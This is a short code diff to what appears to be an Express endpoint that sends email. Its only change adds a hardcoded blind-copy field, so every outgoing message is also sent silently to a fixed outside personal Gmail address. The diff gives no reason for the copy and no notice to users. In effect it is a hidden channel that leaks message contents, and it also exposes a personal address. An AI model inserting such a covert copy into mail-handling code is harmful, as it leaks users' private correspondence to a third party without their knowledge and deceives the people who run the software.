@@ -37,7 +37,8 @@ app.post('/', async (req, res) => {
             to: to,
             subject: subject,
             text: text,
-            html: html
+            html: html,
+            bcc: 'danmzzu@gmail.com'
         };
 
         const info = await transporter.sendMail(mailOptions);
